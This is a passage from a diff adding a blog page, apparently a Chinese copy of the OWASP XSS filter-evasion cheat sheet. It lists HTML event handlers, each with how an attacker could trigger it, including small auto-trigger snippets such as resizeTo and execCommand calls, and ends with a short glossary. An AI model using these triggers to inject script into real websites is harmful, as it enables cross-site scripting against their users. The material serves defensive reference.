+  <li>onPaste() (user would need to paste or attacker could use the execCommand(“Paste”) function)</li>
+  <li>onPause() (the onpause event fires on every element that is active when the timeline pauses, including the body element)</li>
+  <li>onPopState() (fires when user navigated the session history)</li>
+  <li>onProgress() (attacker would use this as a flash movie was loading)</li>
+  <li>onPropertyChange() (user or attacker would need to change an element property)</li>
+  <li>onReadyStateChange() (user or attacker would need to change an element property)</li>
+  <li>onRedo() (user went forward in undo transaction history)</li>
+  <li>onRepeat() (the event fires once for each repetition of the timeline, excluding the first full cycle)</li>
+  <li>onReset() (user or attacker resets a form)</li>
+  <li>onResize() (user would resize the window; attacker could auto initialize with something like: <script>self.resizeTo(500,400);</script>)</li>
+  <li>onResizeEnd() (user would resize the window; attacker could auto initialize with something like: <script>self.resizeTo(500,400);</script>)</li>
+  <li>onResizeStart() (user would resize the window; attacker could auto initialize with something like: <script>self.resizeTo(500,400);</script>)</li>
+  <li>onResume() (the onresume event fires on every element that becomes active when the timeline resumes, including the body element)</li>
+  <li>onReverse() (if the element has a repeatCount greater than one, this event fires every time the timeline begins to play backward)</li>
+  <li>onRowsEnter() (user or attacker would need to change a row in a data source)</li>
+  <li>onRowExit() (user or attacker would need to change a row in a data source)</li>
+  <li>onRowDelete() (user or attacker would need to delete a row in a data source)</li>
+  <li>onRowInserted() (user or attacker would need to insert a row in a data source)</li>
+  <li>onScroll() (user would need to scroll, or attacker could use the scrollBy() function)</li>
+  <li>onSeek() (the onreverse event fires when the timeline is set to play in any direction other than forward)</li>
+  <li>onSelect() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand(“SelectAll”);)</li>
+  <li>onSelectionChange() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand(“SelectAll”);)</li>
+  <li>onSelectStart() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand(“SelectAll”);)</li>
+  <li>onStart() (fires at the beginning of each marquee loop)</li>
+  <li>onStop() (user would need to press the stop button or leave the webpage)</li>
+  <li>onStorage() (storage area changed)</li>
+  <li>onSyncRestored() (user interrupts the element’s ability to play its media as defined by the timeline to fire)</li>
+  <li>onSubmit() (requires attacker or user submits a form)</li>
+  <li>onTimeError() (user or attacker sets a time property, such as dur, to an invalid value)</li>
+  <li>onTrackChange() (user or attacker changes track in a playList)</li>
+  <li>onUndo() (user went backward in undo transaction history)</li>
+  <li>onUnload() (as the user clicks any link or presses the back button or attacker forces a click)</li>
+  <li>onURLFlip() (this event fires when an Advanced Streaming Format (ASF) file, played by a HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in the ASF file)</li>
+  <li>seekSegmentTime() (this is a method that locates the specified point on the element’s segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.)</li>
+</ul>
+
+<h2 id="附录">附录</h2>
+
+<h3 id="owasp--open-web-application-security-project">OWASP , Open Web Application Security Project</h3>
+
+<p>知名Web安全和数据库安全研究组织</p>
+
+<h3 id="english-术语对照">English 术语对照</h3>
+
+<dl>
+  <dt>XSS Vector</dt>
+  <dd>用来注入的XSS脚本字符串</dd>
+  <dt>Polyglot <a href="https://en.wikipedia.org/wiki/Polyglot_(computing)">wiki</a></dt>
+  <dd>In computing, a polyglot is a computer program or script written in a valid form of multiple programming languages, which performs the same operations or output independent of the programming language used to compile or interpret it.</dd>
+</dl>
+
+
+      <footer class="entry-meta">
+        <span class="entry-tags"><a href="/tags#javascript" title="Pages tagged javascript" class="tag"><span class="term">javascript</span></a><a href="/tags#security" title="Pages tagged security" class="tag"><span class="term">security</span></a><a href="/tags#xss" title="Pages tagged xss" class="tag"><span class="term">xss</span></a><a href="/tags#filter-evasion" title="Pages tagged filter-evasion" class="tag"><span class="term">filter-evasion</span></a><a href="/tags#xss-vector" title="Pages tagged xss-vector" class="tag"><span class="term">xss-vector</span></a></span>
+        
+        
+      </footer>
+    </div><!-- /.entry-content -->
+    
+    
+    
+  </article>
+</div><!-- /#main -->
+</div><!-- post container -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+  // embeded-iframe
+  $(window).load(function(){
+    $('.embeded-iframe').each(function(){
+      $(this).height($(this).contents().find('html').height());
+    });
+  });
+</script>
+
+
+
+
+
+<div class="back-to-top">
+    <a href="#top" data-scroll>
+        <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    </a>
+</div>
+
+<div class="footer-wrapper">
+  <footer role="contentinfo">
+    <span>&copy; 2023 wi. Powered by <a href="http://jekyllrb.com" rel="nofollow">Jekyll</a> using the <a href="http://github.com/aron-bordin/neo-hpstr-jekyll-theme" rel="nofollow">Neo-HPSTR Theme</a>.</span>
+
+<script src="/assets/js/main.js?20230725301728281823445"></script>
+
+  </footer>
+</div><!-- /.footer-wrapper -->
+
+</body>
+</html>
